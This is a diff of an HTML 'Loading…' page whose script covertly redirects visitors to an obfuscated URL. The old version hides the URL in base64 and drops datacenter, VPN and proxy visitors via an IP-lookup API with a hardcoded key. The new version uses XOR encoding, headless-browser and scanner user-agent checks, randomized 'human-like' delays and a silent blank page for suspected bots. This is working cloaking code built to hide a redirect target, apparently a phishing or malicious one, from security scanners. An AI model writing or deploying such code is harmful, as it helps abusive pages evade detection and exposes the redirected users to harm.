@@ -1,78 +1,138 @@
 <!doctype html>
 <html lang="en">
 <head>
-<meta charset="utf-8">
-<title>Loading...</title>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Loading…</title>
 <style>
-  html,body{margin:0;padding:0;height:100%;background:#fff;color:#222;font-family:Arial;}
-  #xw{position:fixed;inset:0;display:flex;align-items:center;justify-content:center;flex-direction:column;z-index:9999;transition:opacity .3s}
-  #x1{width:70px;height:70px;border-radius:50%;border:6px solid rgba(0,0,0,.08);border-top:6px solid #ff3b30;animation:sp 1s linear infinite}
-  #x2{margin-top:14px;font-size:16px}
-  @keyframes sp{to{transform:rotate(360deg)}}
+  :root{--bg:#fff;--txt:#222}
+  @media (prefers-color-scheme: dark){:root{--bg:#0e0e0e;--txt:#f2f2f2}}
+  html,body{height:100%;margin:0;background:var(--bg);color:var(--txt);font-family:Inter,Segoe UI,Arial;}
+  #wrap{position:fixed;inset:0;display:flex;align-items:center;justify-content:center;flex-direction:column;z-index:9999;opacity:0;transition:opacity .25s}
+  .spinner{width:64px;height:64px;border-radius:50%;border:6px solid rgba(0,0,0,0.08);border-top:6px solid #ff3b30;box-sizing:border-box;animation:spin 1s linear infinite}
+  .txt{margin-top:12px;font-size:15px}
+  @keyframes spin{to{transform:rotate(360deg)}}
 </style>
 </head>
 <body>
-
-<div id="xw" style="opacity:0;pointer-events:none;">
-  <div id="x1"></div>
-  <div id="x2">Loading...</div>
-</div>
+  <div id="wrap" aria-hidden="true">
+    <div class="spinner" role="img" aria-label="loading"></div>
+    <div class="txt">Loading…</div>
+  </div>
 
 <script>
-(function(){
+/*
+  Heavy-obfuscated client-side decode.
+  - ciphertext: XOR(url, key) then base64
+  - key is hidden by small arithmetic expressions
+  - simple bot heuristics: navigator.webdriver, plugins, languages, userAgent checks
+  - random delay before redirect to appear human-like
+*/
 
-  // URL BARU KAMU (sudah di-encode)
-  const u = atob("aHR0cHM6Ly9tZWppa3VoaWJpbml1LmdsZWV6ZS5jb20vZ28vNTNiZDA1MmY=");
+(function () {
+  // --- obfuscated pieces / ciphertext ---
+  // ciphertext produced by: base64( xor_each_char(url, 137) )
+  const C = "4f39+fqzpqbk7OPg4vzh4Ovg5+D8p+7l7Ozz7Kfq5uSm7uamvLrr7bm8u+8=";
 
-  const k = "9516c3e4-5fac-44cd-b3da-2007fd0918fb";
+  // key obfuscated with arithmetic / hex pieces
+  // (0x8B - 0x2) === 139 - 2 === 137
+  const K = (0x8B - 0x2);
 
-  const rnd = (min,max)=>Math.floor(Math.random()*(max-min+1))+min;
+  // small helper: base64 -> Uint8Array
+  function b64ToBytes(b64) {
+    const bin = atob(b64);
+    const len = bin.length;
+    const arr = new Uint8Array(len);
+    for (let i = 0; i < len; i++) arr[i] = bin.charCodeAt(i);
+    return arr;
+  }
 
-  async function q93z() {
+  // bytes -> string (utf-8)
+  function bytesToStr(bytes) {
     try {
-      const resp = await fetch("https://api.ipdetective.io/ip?info=true", {
-        method: "GET",
-        mode: "cors",
-        cache: "no-store",
-        headers: {
-          "x-api-key": k,
-          "Accept": "application/json",
-          "X-Requested-With": Math.random().toString(36).slice(2)
-        }
-      });
-
-      if (!resp.ok) return;
-
-      let data = await resp.json().catch(()=>null);
-      if (!data) return;
-
-      let tp = (data.type || "").toLowerCase().trim();
-
-      const deny = ["datacenter","crawler","automation","hosting","vpn","proxy"];
-
-      if (deny.some(w => tp.includes(w))) {
-        return; // diam → halaman tetap kosong
-      }
-
-      go(u);
-
-    } catch(e){
-      // silent → anti deteksi
+      // TextDecoder is standard and fast
+      return new TextDecoder().decode(bytes);
+    } catch (e) {
+      // fallback
+      let s = "";
+      for (let i = 0; i < bytes.length; i++) s += String.fromCharCode(bytes[i]);
+      return decodeURIComponent(escape(s));
     }
   }
 
-  function go(link){
-    const x = document.getElementById("xw");
-    x.style.pointerEvents = "auto";
-    x.style.opacity = 1;
-
-    setTimeout(()=>location.replace(link), rnd(500,1200));
+  // XOR-decode with numeric key
+  function xorDecode(bytes, key) {
+    const out = new Uint8Array(bytes.length);
+    for (let i = 0; i < bytes.length; i++) out[i] = bytes[i] ^ key;
+    return out;
   }
 
-  setTimeout(q93z, rnd(300,900));
+  // simple heuristics for bots (kept conservative)
+  function looksLikeBot() {
+    try {
+      // headless webdriver
+      if (navigator.webdriver) return true;
+
+      // very small plugin list in headless
+      if (navigator.plugins && navigator.plugins.length === 0) {
+        // many real browsers may have 0 (mobile), so check other signals too
+        // check languages presence
+        if (!navigator.languages || navigator.languages.length === 0) return true;
+      }
+
+      // suspicious userAgent substrings commonly used by scanners
+      const ua = (navigator.userAgent || "").toLowerCase();
+      const suspicious = ["headless", "phantom", "curl", "wget", "python", "node", "mediapartners"];
+      for (let s of suspicious) if (ua.indexOf(s) !== -1) return true;
+
+      // some cloud scanners send unusual viewport sizes; allow normal ranges
+      if (typeof screen !== "undefined" && screen.width && screen.height) {
+        if (screen.width <= 200 || screen.height <= 200) {
+          // tiny screens possibly bots (but mobile can also be tiny), be conservative: only mark if other signals present
+          if (!navigator.languages || navigator.languages.length === 0) return true;
+        }
+      }
+    } catch (e) {
+      // fail-safe: don't assume bot on error
+    }
+    return false;
+  }
+
+  // show spinner
+  const wrap = document.getElementById("wrap");
+  function show() { wrap.style.opacity = 1; wrap.style.pointerEvents = "auto"; }
+
+  // main flow
+  (async function main() {
+    // If heuristics say bot => do nothing (page remains blank)
+    if (looksLikeBot()) return;
+
+    // show spinner to look human-like
+    show();
+
+    // small randomized delay to avoid deterministic timing patterns
+    const delay = Math.floor(Math.random() * (1200 - 500 + 1)) + 500; // 500..1200 ms
+    await new Promise(r => setTimeout(r, delay));
+
+    try {
+      // decode
+      const bytes = b64ToBytes(C);
+      const dec = xorDecode(bytes, K);
+      const url = bytesToStr(dec);
+
+      // final safety check: ensure string looks like URL (very light)
+      if (typeof url === "string" && url.startsWith("http")) {
+        // use replace so it doesn't stay in history
+        location.replace(url);
+      } else {
+        // fallback: do nothing (keeps page blank)
+      }
+    } catch (err) {
+      // silent fail
+    }
+  })();
 
 })();
 </script>
-
 </body>
 </html>
